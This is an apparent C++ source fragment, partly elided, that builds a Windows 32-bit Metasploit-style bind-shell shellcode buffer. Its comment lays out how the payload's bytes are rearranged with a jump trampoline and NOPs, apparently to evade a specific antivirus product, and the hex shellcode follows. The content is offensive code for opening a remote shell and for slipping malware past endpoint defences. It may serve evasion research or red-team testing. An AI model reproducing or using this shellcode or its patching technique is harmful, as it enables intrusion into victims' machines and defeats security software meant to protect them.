...
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        bool Windows_MSF_Shell_Bind_32_Kasper::initPayload()
        {
            ...
            /*
              Original payload:
              8B048B           MOV EAX,DWORD PTR DS:[EBX+ECX*4]
              03C2             ADD EAX,EDX
              894424 24        MOV DWORD PTR SS:[ESP+24],EAX
              5B               POP EBX

              Patched payload:
              E9 AE000000      JMP <end of original payload + 1>
              90               NOP
              90               NOP
              90               NOP
              90               NOP
              ...
              End of original payload:
              C3               RETN
		
              End of patched payload:
              8B048B           MOV EAX,DWORD PTR DS:[EBX+ECX*4]
              03C2             ADD EAX,EDX
              894424 24        MOV DWORD PTR SS:[ESP+24],EAX
              E9 48FFFFFF      JMP <back to POP EBX>
              90               NOP
            */
            unsigned char buf[] = 
                ...
                "8b582401d3668b0c4b8b581c01d3E9"
                "AE000000909090905b5b61595a51ff"
                ...
                "c85fffd501c329c685f675ecc38B04"
                "8B03C289442424E948FFFFFF90"
                ;
